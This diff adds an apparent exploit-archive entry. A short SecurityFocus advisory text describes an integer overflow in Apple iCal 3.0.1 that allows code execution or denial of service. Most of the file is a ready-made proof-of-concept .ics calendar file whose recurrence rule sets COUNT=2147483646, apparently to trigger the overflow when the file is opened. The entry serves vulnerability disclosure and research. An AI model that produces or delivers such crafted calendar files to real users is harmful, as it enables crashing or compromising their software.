@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/28629/info
+
+Apple iCal is prone to an integer-overflow vulnerability because it fails to ensure that integer values aren't overrun.
+
+An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.
+
+This issue affects iCal 3.0.1 running on Mac OS X 10.5.1; previous versions may also be affected. 
+
+BEGIN:VCALENDAR
+X-WR-TIMEZONE:America/Buenos_Aires
+PRODID:-//Apple Inc.//iCal 3.0//EN
+CALSCALE:GREGORIAN
+X-WR-CALNAME: Vulnerable
+VERSION:2.0
+X-WR-RELCALID:10DE4203-4FA5-4E23-AE4D-9DAE3157C9E5
+METHOD:PUBLISH
+BEGIN:VTIMEZONE
+TZID:America/Buenos_Aires
+BEGIN:DAYLIGHT
+TZOFFSETFROM:-0300
+TZOFFSETTO:-0300
+DTSTART:19991003T000000
+RDATE:19991003T000000
+TZNAME:ARST
+END:DAYLIGHT
+BEGIN:STANDARD
+TZOFFSETFROM:-0300
+TZOFFSETTO:-0300
+DTSTART:20000303T000000
+RDATE:20000303T000000
+RDATE:20001231T210000
+TZNAME:ART
+END:STANDARD
+END:VTIMEZONE
+BEGIN:VEVENT
+SEQUENCE:4
+DTSTART;TZID=America/Buenos_Aires:20071225T110000
+DURATION:PT1H
+UID:48878014-5F03-43E5-8639-61E708714F9A
+DTSTAMP:20071213T130632Z
+SUMMARY:Vuln
+CREATED:20071213T130611Z
+RRULE:FREQ=DAILY;INTERVAL=1;COUNT=2147483646
+END:VEVENT
+END:VCALENDAR
